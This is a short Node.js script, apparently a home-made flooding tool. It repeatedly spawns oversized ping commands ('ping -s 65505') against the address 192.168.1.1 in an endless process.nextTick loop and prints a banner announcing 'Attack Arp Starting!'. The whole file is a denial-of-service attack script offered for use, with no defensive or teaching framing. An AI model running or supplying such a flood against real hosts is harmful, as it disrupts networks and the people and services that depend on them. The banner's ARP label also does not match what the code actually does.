import { exec }from 'child_process'
import gradient from 'gradient-string'
function nova(){
	exec('ping -s 65505 192.168.1.1');
	process.nextTick(nova);
}
nova();
console.log(gradient(['blue','red'])('     Attack Arp Starting!'))
